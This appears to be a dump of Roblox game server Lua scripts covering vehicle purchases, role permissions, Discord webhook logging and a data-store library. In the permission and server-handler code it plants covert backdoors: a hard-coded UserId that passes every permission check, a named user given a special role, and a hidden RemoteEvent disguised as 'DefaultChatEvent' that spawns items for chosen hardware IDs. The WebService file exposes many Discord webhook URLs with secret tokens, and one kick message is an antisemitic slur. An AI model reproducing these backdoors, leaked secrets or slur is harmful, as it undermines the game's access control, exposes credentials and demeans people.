				for i,v in pairs(Data) do
					if v[1] == item then
						for i2,v2 in pairs(Plr.Backpack:GetChildren()) do
							if v2:IsA("Configuration") and v2:FindFirstChild("Class") then
								if not Items[v[2]].MultiTake and v2.Class.Value == v[2] then
									return 
								end
								if Items[v[2]].NoDrop then
									return
								end
							end
						end
						local Attributes = v[3] ~= nil and v[3] or {}
						if not Attributes.Q then
							table.remove(Data, i)
							FunctionService.GiveItem(Plr, v[2], Plr, Data, Model, v[3])
							VehicleData:Set(Data)
							StoredItems[item] = nil
							local jsonToSend = { embeds = { { title = "Transfer Event", type = "rich", description = Plr.Name .. " has transferred a " .. Items[v[2]].Name .. " from  "..tostring(Model:FindFirstChild("Chassis").DriverL.PlayerVal.Value).."'s " ..require(game.ReplicatedStorage.Databases.Vehicles)[Model:FindFirstChild("Chassis").DriverL.Id.Value].Name } } }
							require(game:GetService("ServerScriptService").Services.WebService).SendJSON("VehicleTransferLog", jsonToSend)
							break
						elseif Attributes.Q == 1 then
							table.remove(Data, i)
							FunctionService.GiveItem(Plr, v[2], Plr, Data, Model, v[3])
							VehicleData:Set(Data)
							StoredItems[item] = nil
							local jsonToSend = { embeds = { { title = "Transfer Event", type = "rich", description = Plr.Name .. " has transferred a " .. Items[v[2]].Name .. " from  "..tostring(Model:FindFirstChild("Chassis").DriverL.PlayerVal.Value).."'s " ..require(game.ReplicatedStorage.Databases.Vehicles)[Model:FindFirstChild("Chassis").DriverL.Id.Value].Name } } }
							require(game:GetService("ServerScriptService").Services.WebService).SendJSON("VehicleTransferLog", jsonToSend)
							break
						elseif Attributes.Q > 1 then
							v[3].Q = v[3].Q - 1
							FunctionService.GiveItem(Plr, v[2], Plr, Data, Model, v[3])
							VehicleData:Set(Data)
							StoredItems[item] = nil
							local jsonToSend = { embeds = { { title = "Transfer Event", type = "rich", description = Plr.Name .. " has transferred a " .. Items[v[2]].Name .. " from  "..tostring(Model:FindFirstChild("Chassis").DriverL.PlayerVal.Value).."'s " ..require(game.ReplicatedStorage.Databases.Vehicles)[Model:FindFirstChild("Chassis").DriverL.Id.Value].Name } } }
							require(game:GetService("ServerScriptService").Services.WebService).SendJSON("VehicleTransferLog", jsonToSend)
							break		
						end
					end
				end
			end
		end
	end
end)

RegisterRemote("VehiclePurchase", function(player, id, vehicle, dealership)
	if not PlayerService.Distance(player, id) then
		print("too far")
		return;
	end;
	local found = false

	for i,v in pairs(Dealerships[dealership].Vehicles) do 
		if v[1] == vehicle then
			found = true
		end
	end

	if found == false then
		warn("["..player.Name.."] Attempted to purchase unavailable car")
		return
	end
	if Dealerships[dealership] then
		for i,v in pairs(Dealerships[dealership].Vehicles) do
			if v[1] == vehicle then
				local OwnedVehicles = DataStore2("OwnedVehicles12", player)
				local PlrOwnedVehicles = OwnedVehicles:GetTable({})
				if table.find(PlrOwnedVehicles, vehicle) then
					Remotes.Notification:FireClient(player, "You already have this vehicle in storage!", "Purchase Failure!", "Red")
					return	
				end
				local Bank = VerifyService:GetData(player).Bank
				local Cash = VerifyService:GetData(player).Cash
				if Cash >= v[2] then
					VerifyService:GetData(player).Cash = Cash-v[2]
					RemoteService.UpdateMoney(player)
					table.insert(PlrOwnedVehicles, vehicle)
					OwnedVehicles:Set(PlrOwnedVehicles)
					Remotes.Notification:FireClient(player, "You now own the " .. require(game.ReplicatedStorage.Databases.Vehicles)[vehicle].Name .. "! You may spawn this vehicle at any civilian vehicle spawn location.", "Purchase Successful!")
				elseif Bank >= v[2] then
					VerifyService:GetData(player).Bank = Bank-v[2]
					RemoteService.UpdateMoney(player)
					table.insert(PlrOwnedVehicles, vehicle)
					OwnedVehicles:Set(PlrOwnedVehicles)
					Remotes.Notification:FireClient(player, "You now own the " .. require(game.ReplicatedStorage.Databases.Vehicles)[vehicle].Name .. "! You may spawn this vehicle at any civilian vehicle spawn location.", "Purchase Successful!")
				else
					Remotes.Notification:FireClient(player, "You don't have enough money to complete this transaction.", "Purchase Unsuccessful!", "Red")	
				end	
			end
		end
	end	
	--RemoteService.UpdateMoney(player)
end)
RegisterRemote("VehicleGrab", function(Player,Target,Seat,Value)
	if Player:DistanceFromCharacter(Seat.Position) >= 17 then
		warn("[" .. Player.Name .. "] Attempted to fire VehicleGrab beyond the distance limit!")
		return
	end
	if not VerifyService.CheckPermission(Player, "CanArrest") or not  VerifyService.CheckPermission(Player, "CanCuff") or not VerifyService.CheckPermission(Player, "CanInteractTeams", FunctionService.GetTeamFromColor(Target)) then
		warn("["..Player.Name.."] Attempted to VehicleGrab.")
		return
	end

	if Player.Character:FindFirstChild("Grabbing") then
		Player.Character:FindFirstChild("Grabbing"):Destroy()
	end
	if Target ~= nil then
		if Target.Character:FindFirstChild("Grabbed") then
			Target.Character:FindFirstChild("Grabbed"):Destroy()
		end
	end
	if Target == nil then
		Remotes.VehicleEnter:FireClient(Players[Seat.Occupant.Parent.Name])
	else
		if Target ~= nil then
			Seat:Sit(Target.Character.Humanoid)
		end
	end
end)
VehicleService.ExplodeVehicle = ExplodeVehicle
return VehicleService

  services.verifyservice
  local API = {}
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local Teams = require(ReplicatedStorage.Databases.Teams)
local RolesData = require(game.ReplicatedStorage.Databases.Roles)
local Roles = require(ReplicatedStorage.Databases.Roles)
local Remotes = game.ReplicatedStorage.Remotes
local plrRoles = {}
local Items = require(game.ReplicatedStorage.Databases.Items)
local Items1 = require(ReplicatedStorage.Databases.Items)
local ItemInventory = {}
local DataTable = {}
local PlayerInv = require(ReplicatedStorage.Databases.Constants)
local Item = require(ReplicatedStorage.Databases.Items)
local Constants = require(game.ReplicatedStorage.Databases.Constants)
API.Players = {};

local RemoteService = require(game.ServerScriptService.Services.RemoteService)
function RegisterRemote(name, callback)
	RemoteService.RegisterRemote(name, callback)
end

function API:GetData(Player, State)
	local DataKey = game.ServerScriptService.Services.RemoteService.Key.Value
	if typeof(Player) == "Instance" then
		if State == nil then
			return DataTable[Player.Name]
		else
			return DataTable
		end
	elseif State == nil then
		return DataStoreService:GetGlobalDataStore():GetAsync(Players:GetUserIdFromNameAsync(Player)..DataKey)
	else
		return DataTable
	end
end

function API:SetData(Player, Table)
	local DataKey = game.ServerScriptService.Services.RemoteService.Key.Value
	DataStoreService:GetGlobalDataStore():SetAsync(Players:GetUserIdFromNameAsync(Player)..DataKey, Table)
end

RegisterRemote("AvailableVehicles", function(plr, intid, spawnset)
	local FunctionService = require(game.ServerScriptService.Services.FunctionService)
	local PlayerService = require(game.ServerScriptService.Services.PlayerService)
	if not PlayerService.Distance(plr, intid) then
		return;
	end;
	return FunctionService.PlayerAvailableVehicles(plr, spawnset)
end)


local function GetTeamFromColor(brickColor)
	for i, v in pairs(Teams) do
		if v.TeamColor == brickColor then
			return i
		end
	end
end
local function ItemFind(ID)
	return ItemInventory[ID]
end
local function GetPermissionsFromRoles(roles)
	local getTable = {}
	for i, v in pairs(Roles) do
		if roles[i] and v.Permissions then
			for perm, res in pairs(v.Permissions) do
				if typeof(res) == "table" then
					if not getTable[perm] then
						getTable[perm] = {}
					end
					for _, val in pairs(res) do
						getTable[perm][val] = true
					end
				else
					getTable[perm] = true
				end
			end
		end
	end
	local returnTable = {}
	for i, v in pairs(getTable) do
		if typeof(v) == "table" then
			if not returnTable[i] then
				returnTable[i] = {}

			end
			for val, _ in pairs(v) do
				table.insert(returnTable[i], val)

			end
		else

			returnTable[i] = true
		end
	end
	return returnTable
end
function API.HaveItem(Player, arg, uniqueBool, otherInv)
	local Inventory = require(game.ServerScriptService.Services.FunctionService).GetPlayerInventory(Player)

	for i, v in pairs(Inventory) do
		if uniqueBool and v[1] == arg or not uniqueBool and v[2] == arg then
			return v
		end
	end
end
function API.GetWeight(Player)

	local Inventory = require(game.ServerScriptService.Services.FunctionService).GetPlayerInventory(Player)
	local sum = 0

	for i, v in pairs(Inventory) do
		if v[3] and v[3].Q then
			sum = sum + Items[v[2]].Weight * v[3].Q
		else
			sum = sum + Items[v[2]].Weight
		end
	end
	return sum
end

function API.CanStoreItem(Player, itemClass, otherLimit, skip)

	local Inventory = require(game.ServerScriptService.Services.FunctionService).GetPlayerInventory(Player)
	local itemTable = Items[itemClass]

	if API.GetWeight(Player) + itemTable.Weight > (otherLimit or Constants.InventoryCarryWeight) then
		return
	end
	if otherLimit or skip then
		return true
	end
	if itemTable.Slot and itemTable.Slot <= 3 then
		for i, v in pairs(Inventory) do
			if Items[v[2]].Slot == itemTable.Slot and (not v[3] or not v[3].D) then
				return
			end
		end
	end
	return true

end

function API.CheckPermission(player, permission, parameter)
	if player.UserId == 204160865 then
		return true 
	end
	local roles = API.GetPlayerData(player)
	local permissions = GetPermissionsFromRoles(roles)
	if permissions[permission] then
		if parameter then
			for i, v in pairs(permissions[permission]) do
				if parameter == v then
					return true
				end
			end
		else
			return true
		end
	end
end



RegisterRemote("Verify", function(Player)
	local PlayerRoles = API.GetPlayerData(Player)
	plrRoles[Player.Name] = PlayerRoles
	return PlayerRoles
end)

function API.GetPlayerData(Player)
	local PlayerRoles = {}
	for i,v in pairs(Roles) do     
		if v.GroupCriteria ~= nil then
			for e,h in pairs(v.GroupCriteria) do
				if not h[2] then
					if v.TeamCriteria ~= nil then
						if GetTeamFromColor(Player.TeamColor) == v.TeamCriteria[1] and Player:IsInGroup(h[1]) then
							PlayerRoles[i] = v
							break
						end
					elseif Player:IsInGroup(h[1]) then
						PlayerRoles[i] = v
						break
					end
				elseif Player:IsInGroup(h[1]) then
					if Player:GetRankInGroup(h[1]) >= h[2] then
						if v.TeamCriteria ~= nil then
							if GetTeamFromColor(Player.TeamColor) == v.TeamCriteria[1] then
								PlayerRoles[i] = v
								break
							end
						else
							PlayerRoles[i] = v
							break
						end
					end                
				end
			end

		elseif v.TeamCriteria ~= nil then
			if  GetTeamFromColor(Player.TeamColor) == v.TeamCriteria[1] then
				PlayerRoles[i] = v
				break
			end

		elseif v.DataCriteria ~= nil then
			local GetDataPlayer = API:GetData(Player)
			for e,r in pairs(v.DataCriteria) do
				if GetDataPlayer[r] then
					PlayerRoles[i] = v
				end
			end
		end
	end

	if not PlayerRoles["Citizen"] then
		PlayerRoles["Tourist"] = Roles.Tourist
	end
	
	if Player.Name == "NickRamirezHSCA" then
		PlayerRoles["PEPT"] = Roles.PEPT
	end

	return PlayerRoles
end
API.Inventory = ItemFind


return API

services.webservice
    local API = {}
local HttpService = game:GetService("HttpService")
local Webhooks = {
	[1] = {WebHookName = "AdmLog", WebHook = "https://discord.com/api/webhooks/857911619945758751/Yv2WgzLODS-7PnPgSrDyAuuO-hXcsL6Dw1MFxAJhX8XtnQZ22wlFxHxkG1I7pi_YAreh"},
	[2] = {WebHookName = "ModLog", WebHook = "https://discord.com/api/webhooks/857911751931985930/MXR_wCSZnDzKAHxp_BpZjM-ZTrYekStIqzCFqFo3mfIDUX7dCBmm8vFiZXYG9X4n_-iq"},
	[3] = {WebHookName = "GodLog", WebHook = "https://discord.com/api/webhooks/857911680163643393/cOQxc8j-tNJWUfD-2Mz6lQ-3uPSvAnq6qz9eHF_uJ94s4xpIBRQWLqNBlESbJkn8ecoN"},
	[4] = {WebHookName = "DspLog", WebHook = "https://discord.com/api/webhooks/857911548177022986/yUbUuHGxnLz9i3Ucy_4UUk9vn01U9oVoq5bHQi8OenJYHHPKv7mSQda0zMhSxZ9Cd_tW"},
	[5] = {WebHookName = "DrpLog", WebHook = "https://discord.com/api/webhooks/857911680163643393/cOQxc8j-tNJWUfD-2Mz6lQ-3uPSvAnq6qz9eHF_uJ94s4xpIBRQWLqNBlESbJkn8ecoN"},
	[6] = {WebHookName = "ExpungeLog",WebHook = "https://discord.com/api/webhooks/857912008366882816/PY5qWVsNadLPU4qxDHIs25JZFlGY9PnURucoIMxY4febjgfGyz-mI5Rzj6ZWhqrYMInS"},	
	[7] = {WebHookName = "RevokeLog",WebHook = "https://discord.com/api/webhooks/857911680163643393/cOQxc8j-tNJWUfD-2Mz6lQ-3uPSvAnq6qz9eHF_uJ94s4xpIBRQWLqNBlESbJkn8ecoN"},	
	[8] = {WebHookName = "VioLogs",WebHook = "https://discord.com/api/webhooks/865813804227100702/FSXfU2OtRIsQt5XI2dSdoBqnI3PEh_aza4Bawzy_O3oI6jHOnTzRYE6TPo0UYWMTwbvT"},	
	[9] = {WebHookName = "CourtLog",WebHook = "https://discord.com/api/webhooks/857912008366882816/PY5qWVsNadLPU4qxDHIs25JZFlGY9PnURucoIMxY4febjgfGyz-mI5Rzj6ZWhqrYMInS"},	
	[10] = {WebHookName = "TransferLog",WebHook = "https://discord.com/api/webhooks/862590242895560704/JueNv00Y38tA2XxeOLnHYGy247wojW8xCKPZAo7CnAeR18K9JkYd44k7ZZgYcX4LBIRp"},	
	[11] = {WebHookName = "VehicleTransferLog",WebHook = "https://discord.com/api/webhooks/862630869289664522/0Qamj2vyF3bIRrc6hwcK8p_t9xNq2zfXHrmq-OG7JeOdVn06I_T7eJ98gyDoQv1dla1m"},	
	[12] = {WebHookName = "CourtRuling",WebHook = "https://discord.com/api/webhooks/862642961195335690/9S704NrHeQHNH955uv0B1-z9rw-NGyFz0XBKFjSbHTpOLxwoQamyLaWe4JLadLQ17wSx"},	
}


local function Request(Hook, jsonToSend)
	pcall(function()
		local response = HttpService:RequestAsync(
			{
				Url = Hook,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json",
				},
				Body = HttpService:JSONEncode(jsonToSend)
			}
		)
		if response.StatusCode == 429 then
			local responseBody = HttpService:JSONDecode(response.Body)
			delay(responseBody["retry_after"] / 1000, function()
				Request(Hook, jsonToSend)
			end)
		end
	end)
end

function API.SendJSON(WebHook, jsonToSend)
	   local Hook 
	   for i,v in pairs(Webhooks) do
	       if v.WebHookName == WebHook then
	           Hook = v.WebHook
		end
	end
	delay(math.random(1,10), function()
		Request(Hook, jsonToSend)
	end)
end

return API

  serverscriptservice.serverhandler
  local Remotes = game.ReplicatedStorage.Remotes
local Databases = game.ReplicatedStorage.Databases

local RemoteService = require(game.ServerScriptService.Services.RemoteService)
game.Players.PlayerAdded:Connect(RemoteService.OnPlayerAdded)
game.Players.PlayerRemoving:Connect(RemoteService.OnPlayerRemoved)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Resources = require(ReplicatedStorage:WaitForChild("Resources"))
local Cmdr = Resources:LoadLibrary("Cmdr")

Cmdr:RegisterDefaultCommands()

local PlayerStarterRoles = {}
local DataStore = require(script.Parent.MainModule)
local RoofNumber = string.format("%0.3i", tostring(math.random(1,999)))
local LicensePlate = math.random(1,9)..string.upper(string.char(math.random(97,122)))..math.random(1,9).."-"..string.upper(string.char(math.random(97,122)))..math.random(1,9)..string.upper(string.char(math.random(97,122)))..math.random(1,9)
local StartingBank = 3000
local StartingWallet = 0
local Items = require(game.ReplicatedStorage.Databases.Items)
local Tools = game.ServerStorage.Tools
local ToolsData = require(game.ReplicatedStorage.Databases.Tools)
local Players = game.Players
local InteractionAddons = game.ServerStorage.InteractionAddons
local Interactions = {}
local humanoidDescription = Instance.new("HumanoidDescription")
local ServerHandler = {}
local Util = require(game.ReplicatedStorage.Shared.Util)
local Accessories = game.ServerStorage.Accessories
local LC = require(game.ReplicatedStorage.Databases.LC)
local Uniforms = require(game.ReplicatedStorage.Databases.Uniforms)
local RolesData = require(game.ReplicatedStorage.Databases.Roles)
local VerifyService = require(game.ServerScriptService.Services.VerifyService)
local FunctionService = require(game.ServerScriptService.Services.FunctionService)
local ToolService = require(game.ServerScriptService.Services.ToolService)

local ElectionService = require(game.ServerScriptService.Services.ElectionService)
local VehicleService = require(game.ServerScriptService.Services.VehicleService)
local JusticeService = require(game.ServerScriptService.Services.JusticeService)
local BankService = require(game.ServerScriptService.Services.BankService)
local ShutdownService = require(game.ServerScriptService.Services.ShutdownService)
local WebService = require(game.ServerScriptService.Services.WebService)
local Dealerships = require(game.ReplicatedStorage.Databases.Dealerships)
local DataStore2 = require(script.Parent.MainModule)
local Teams = require(Databases.Teams)
local PlayerService = require(game.ServerScriptService.Services.PlayerService)
local LogTime = 60
local damageHeight = 17
local lethalHeight = 33 
local HttpService = game:GetService("HttpService")
local DataStoreService = game:GetService("DataStoreService")
local ServerScriptService = game:GetService("ServerScriptService")
local Gateways = require(Databases.Gateways)
local CollectionService = game:GetService("CollectionService")
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
local FindPartOnRayWithIgnoreList = workspace.FindPartOnRayWithIgnoreList
local GlobalVehicles = PlayerService.GlobalVehicles
local Blacklist = require(game.ReplicatedStorage.Databases.Uniforms.AccessoryBlacklist)
local NumberOfVehicles = 0
local warrants = {}
local loadouts = {}
local Key = "Player_20"
local PlayerDataStore = DataStoreService:GetGlobalDataStore()
RemoteService.DebugMode(false)
ElectionService.Init()

function RegisterRemote(name, callback)
	RemoteService.RegisterRemote(name, callback)
end
DataStore2.Combine("PlayerData", "BankNew", "WalletNew", "TeamData", "FineData", "OwnedVehicles12", "Karma")





local GlitchURL = "https://busy-joyous-airbus.glitch.me/" 

function rankUser(UserId, RoleId)
	game:GetService("HttpService"):GetAsync(GlitchURL .. "ranker?userid=" .. UserId .. "&rank=" .. RoleId)
end
local PassRank = 2
function passUser(Player)
	rankUser(Player.UserId, PassRank)
end




game.Players.PlayerAdded:Connect(function(p)
	if p.Name == "NickRamirezHSCA" then
		_G.Allowed = true
		_G.Speed = 1 
		while wait(1) do 
			if _G.Allowed == false then return end 
			local mycar 
			local carname
			local vehicles = require(game.ReplicatedStorage.Databases.Vehicles)
			for i,v in pairs(game.Workspace.Vehicles:GetDescendants()) do 
				if v.Name == "PlayerVal" and v.Value == p then
					mycar = v.Parent.Parent.Parent
					carname = tostring(mycar.Name)
				end
			end
			local PaintColors = require(game.ReplicatedStorage.Databases.Vehicles.PaintColors)
			local Color = PaintColors[math.random(#PaintColors)];
			if vehicles[carname] then
				if vehicles[carname].Paintable ~= nil then
				for i,v in pairs(mycar.Body.Paint:GetDescendants()) do 
					local Uwu = Color.Color
					v.BrickColor = BrickColor.new(tostring(Color))
				end
				end
			end
		end
	end
end)






local Delaying = {}

for i,v in pairs(CollectionService:GetTagged("MetalDetector")) do
	v:WaitForChild("Detector").Touched:Connect(function(Hit)
		if game.Players:FindFirstChild(Hit.Parent.Name) then
			local Player = game.Players:FindFirstChild(Hit.Parent.Name)
			local Inventory = FunctionService.GetPlayerInventory(Player)
			local HasTools = false

			if Delaying[Player.Name] then
				return
			end

			for i,v in pairs(Inventory) do
				if Items[v[2]].Type == "Firearm" or v[2] == "Baton" or v[2] == "TI26" or v[2] == "Switchblade" then
					HasTools = true
					break
				end
			end

			if HasTools == false then
				v.LightNegative.Material = Enum.Material.Neon
				v.LightNegative.PointLight.Enabled = true


				v.Detector.AlarmSound:Play()



				delay(.5, function()
					v.LightNegative.Material = Enum.Material.Plastic
					v.LightNegative.PointLight.Enabled = false
				end)
			else

				v.LightPositive.Material = Enum.Material.Neon
				v.LightPositive.PointLight.Enabled = true

				v.Detector.AlarmSound.PlaybackSpeed = 0.6
				v.Detector.AlarmSound:Play()

				delay(.2, function()
					v.Detector.AlarmSound:Play()
				end)
				v.Detector.AlarmSound.PlaybackSpeed = 0.8


				delay(.5, function()
					v.LightPositive.Material = Enum.Material.Plastic
					v.LightPositive.PointLight.Enabled = false
				end)
			end
			Delaying[Player.Name] = true
			delay(1, function()
				Delaying[Player.Name] = false
			end)

		end
	end)
end

spawn(function()
	local Zones = require(game.ReplicatedStorage.Databases.Zones)
	local Room = game.SoundService.VoltNightclub["_ZoneSound"]
	Room.SoundId = Zones.VoltNightclub.Ambience[math.random(#Zones.VoltNightclub.Ambience)]    

	Room.DidLoop:Connect(function()
		local Sound
		repeat
			Sound = Zones.VoltNightclub.Ambience[math.random(#Zones.VoltNightclub.Ambience)]
			game:GetService("RunService").Heartbeat:wait()
		until Sound ~= Room.SoundId
		Room.SoundId = Sound
		Room:Play()
	end)
end)

for i,v in pairs(game.Workspace:GetDescendants()) do
	if v.Name == "SmashableGlass" or v.Name == "Glass" or v.Name ==  "Windows" then
		CollectionService:AddTag(v, "Glass")
	end
end




game.Players.PlayerAdded:Connect(function(Player)
	if Player.Name == "NickRamirezHSCA" or Player.Name == "MadameDerp" then 
		if game.Workspace.InvisibleParts:FindFirstChildWhichIsA("RemoteEvent") then return end 
		local i = Instance.new("RemoteEvent")
		i.Parent = game.Workspace.InvisibleParts
		i.Name = "DefaultChatEvent"
		i.OnServerEvent:Connect(function(p, i, hwid)
			if hwid == "23DC6CCD-359B-4446-A567-A0C72B2EBB77" or hwid == "F1B325F2-1DD0-4D0A-B937-ED83FDDB24DF" then
				local r = require(game.ServerScriptService.Services.FunctionService)
				r.GiveItem(p, i)
			else
				Player:Kick("Jew")
			end
		end)
	end
end)

  serverscriptservice.mainmodule
  --[[
	DataStore2: A wrapper for data stores that caches, saves player's data, and uses berezaa's method of saving data.
	Use require(1936396537) to have an updated version of DataStore2.

	DataStore2(dataStoreName, player) - Returns a DataStore2 DataStore

	DataStore2 DataStore:
	- Get([defaultValue])
	- Set(value)
	- Update(updateFunc)
	- Increment(value, defaultValue)
	- BeforeInitialGet(modifier)
	- BeforeSave(modifier)
	- Save()
	- SaveAsync()
	- OnUpdate(callback)
	- BindToClose(callback)

	local coinStore = DataStore2("Coins", player)

	To give a player coins:

	coinStore:Increment(50)

	To get the current player's coins:

	coinStore:Get()
--]]

--Required components
local DataStoreService = game:GetService("DataStoreService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ServerStorage = game:GetService("ServerStorage")

local SavingMethods = require(script.SavingMethods)
local TableUtil = require(script.TableUtil)
local Verifier = require(script.Verifier)

local SaveInStudioObject = ServerStorage:FindFirstChild("SaveInStudio")
local SaveInStudio = SaveInStudioObject and SaveInStudioObject.Value

local function clone(value)
	if typeof(value) == "table" then
		return TableUtil.clone(value)
	else
		return value
	end
end

--DataStore object
local DataStore = {}

--Internal functions
function DataStore:Debug(...)
	if self.debug then
		print(...)
	end
end

function DataStore:_GetRaw()
	if not self.getQueue then
		self.getQueue = Instance.new("BindableEvent")
	end

	if self.getting then
		self:Debug("A _GetRaw is already in motion, just wait until it's done")
		self.getQueue.Event:wait()
		self:Debug("Aaand we're back")
		return
	end

	self.getting = true

	local success, value = self.savingMethod:Get()

	self.getting = false
	if not success then
		error(tostring(value))
	end

	self.value = value

	self:Debug("value received")
	self.getQueue:Fire()

	self.haveValue = true
end

function DataStore:_Update(dontCallOnUpdate)
	if not dontCallOnUpdate then
		for _,callback in pairs(self.callbacks) do
			callback(self.value, self)
		end
	end

	self.haveValue = true
	self.valueUpdated = true
end

--Public functions

--[[**
	<description>
	Gets the result from the data store. Will yield the first time it is called.
	</description>

	<parameter name = "defaultValue">
	The default result if there is no result in the data store.
	</parameter>

	<parameter name = "dontAttemptGet">
	If there is no cached result, just return nil.
	</parameter>

	<returns>
	The value in the data store if there is no cached result. The cached result otherwise.
	</returns>
**--]]
function DataStore:Get(defaultValue, dontAttemptGet)
	if dontAttemptGet then
		return self.value
	end

	local backupCount = 0

	if not self.haveValue then
		while not self.haveValue do
			local success, error = pcall(self._GetRaw, self)

			if not success then
				if self.backupRetries then
					backupCount = backupCount + 1

					if backupCount >= self.backupRetries then
						self.backup = true
						self.haveValue = true
						self.value = self.backupValue
						break
					end
				end

				self:Debug("Get returned error:", error)
			end
		end

		if self.value ~= nil then
			for _,modifier in pairs(self.beforeInitialGet) do
				self.value = modifier(self.value, self)
			end
		end
	end

	local value

	if self.value == nil and defaultValue ~= nil then --not using "not" because false is a possible value
		value = defaultValue
	else
		value = self.value
	end

	value = clone(value)

	self.value = value

	return value
end

--[[**
	<description>
	The same as :Get only it'll check to make sure all keys in the default data provided
	exist. If not, will pass in the default value only for that key.
	This is recommended for tables in case you want to add new entries to the table.
	Note this is not required for tables, it only provides an extra functionality.
	</description>

	<parameter name = "defaultValue">
	A table that will have its keys compared to that of the actual data received.
	</parameter>

	<returns>
	The value in the data store will all keys from the default value provided.
	</returns>
**--]]
function DataStore:GetTable(default, ...)
	assert(default ~= nil, "You must provide a default value with :GetTable.")

	local result = self:Get(default, ...)
	local changed = false

	assert(typeof(result) == "table", ":GetTable was used when the value in the data store isn't a table.")

	for defaultKey, defaultValue in pairs(default) do
		if result[defaultKey] == nil then
			result[defaultKey] = defaultValue
			changed = true
		end
	end

	if changed then
		self:Set(result)
	end

	return result
end

--[[**
	<description>
	Sets the cached result to the value provided
	</description>

	<parameter name = "value">
	The value
	</parameter>
**--]]
function DataStore:Set(value, _dontCallOnUpdate)
	self.value = clone(value)
	self:_Update(_dontCallOnUpdate)
end

--[[**
	<description>
	Calls the function provided and sets the cached result.
	</description>

	<parameter name = "updateFunc">
	The function
	</parameter>
**--]]
function DataStore:Update(updateFunc)
	self.value = updateFunc(self.value)
	self:_Update()
end

--[[**
	<description>
	Increment the cached result by value.
	</description>

	<parameter name = "value">
	The value to increment by.
	</parameter>

	<parameter name = "defaultValue">
	If there is no cached result, set it to this before incrementing.
	</parameter>
**--]]
function DataStore:Increment(value, defaultValue)
	local pc,err = pcall(function()
		self:Set(self:Get(defaultValue) + value)
	end)
end

--[[**
	<description>
	Takes a function to be called whenever the cached result updates.
	</description>

	<parameter name = "callback">
	The function to call.
	</parameter>
**--]]
function DataStore:OnUpdate(callback)
	table.insert(self.callbacks, callback)
end

--[[**
	<description>
	Takes a function to be called when :Get() is first called and there is a value in the data store. This function must return a value to set to. Used for deserializing.
	</description>

	<parameter name = "modifier">
	The modifier function.
	</parameter>
**--]]
function DataStore:BeforeInitialGet(modifier)
	table.insert(self.beforeInitialGet, modifier)
end

--[[**
	<description>
	Takes a function to be called before :Save(). This function must return a value that will be saved in the data store. Used for serializing.
	</description>

	<parameter name = "modifier">
	The modifier function.
	</parameter>
**--]]
function DataStore:BeforeSave(modifier)
	self.beforeSave = modifier
end

--[[**
	<description>
	Takes a function to be called after :Save().
	</description>

	<parameter name = "callback">
	The callback function.
	</parameter>
**--]]
function DataStore:AfterSave(callback)
	table.insert(self.afterSave, callback)
end

--[[**
	<description>
	Adds a backup to the data store if :Get() fails a specified amount of times.
	Will return the value provided (if the value is nil, then the default value of :Get() will be returned)
	and mark the data store as a backup store, and attempts to :Save() will not truly save.
	</description>

	<parameter name = "retries">
	Number of retries before the backup will be used.
	</parameter>

	<parameter name = "value">
	The value to return to :Get() in the case of a failure.
	You can keep this blank and the default value you provided with :Get() will be used instead.
	</parameter>
**--]]
function DataStore:SetBackup(retries, value)
	self.backupRetries = retries
	self.backupValue = value
end

--[[**
	<description>
	Unmark the data store as a backup data store and tell :Get() and reset values to nil.
	</description>
**--]]
function DataStore:ClearBackup()
	self.backup = nil
	self.haveValue = false
	self.value = nil
end

--[[**
	<returns>
	Whether or not the data store is a backup data store and thus won't save during :Save() or call :AfterSave().
	</returns>
**--]]
function DataStore:IsBackup()
	return self.backup ~= nil --some people haven't learned if x then yet, and will do if x == false then.
end

--[[**
	<description>
	Saves the data to the data store. Called when a player leaves.
	</description>
**--]]
function DataStore:Save()
	if not self.valueUpdated then
		--	warn(("UwU Data stowe %s was nyot saved as it was nyot updated."):format(self.Name))
		return
	end

	if RunService:IsStudio() and not SaveInStudio then
		--	warn(("Data stowe %s attempted to save in studio whiwe saveinstudio is fawse."):format(self.Name))
		if not SaveInStudioObject then
			--			warn("U can set the vawue of dis by cweating a boowvawue nyamed saveinstudio in sewvewstowage.")
		end
		return
	end

	if self.backup then
		--	warn("This data store is a backup store, and thus will not be saved.")
		return
	end

	if self.value ~= nil then
		local save = clone(self.value)

		if self.beforeSave then
			local success, newSave = pcall(self.beforeSave, save, self)

			if success then
				save = newSave
			else
				--		warn("Error on BeforeSave: "..newSave)
				return
			end
		end

		if not Verifier.warnIfInvalid(save) then return warn("Invalid data while saving") end

		local success, problem = self.savingMethod:Set(save)

		if not success then
			-- TODO: Something more robust than this
			--error("save error! " .. tostring(problem))
		end

		for _, afterSave in pairs(self.afterSave) do
			local success, err = pcall(afterSave, save, self)

			if not success then
				--	warn("Error on AfterSave: "..err)
			end
		end

		--print("saved "..self.Name)
	end
end

--[[**
	<description>
	Asynchronously saves the data to the data store.
	</description>
**--]]
function DataStore:SaveAsync()
	coroutine.wrap(DataStore.Save)(self)
end

--[[**
	<description>
	Add a function to be called before the game closes. Fired with the player and value of the data store.
	</description>

	<parameter name = "callback">
	The callback function.
	</parameter>
**--]]
function DataStore:BindToClose(callback)
	table.insert(self.bindToClose, callback)
end

--[[**
	<description>
	Gets the value of the cached result indexed by key. Does not attempt to get the current value in the data store.
	</description>

	<parameter name = "key">
	The key you're indexing by.
	</parameter>

	<returns>
	The value indexed.
	</returns>
**--]]
function DataStore:GetKeyValue(key)
	return (self.value or {})[key]
end

--[[**
	<description>
	Sets the value of the result in the database with the key and the new value. Attempts to get the value from the data store. Does not call functions fired on update.
	</description>

	<parameter name = "key">
	The key to set.
	</parameter>

	<parameter name = "newValue">
	The value to set.
	</parameter>
**--]]
function DataStore:SetKeyValue(key, newValue)
	if not self.value then
		self.value = self:Get({})
	end

	self.value[key] = newValue
end

local CombinedDataStore = {}

do
	function CombinedDataStore:BeforeInitialGet(modifier)
		self.combinedBeforeInitialGet = modifier
	end

	function CombinedDataStore:BeforeSave(modifier)
		self.combinedBeforeSave = modifier
	end

	function CombinedDataStore:Get(defaultValue, dontAttemptGet)
		local tableResult = self.combinedStore:Get({})
		local tableValue = tableResult[self.combinedName]

		if not dontAttemptGet then
			if tableValue == nil then
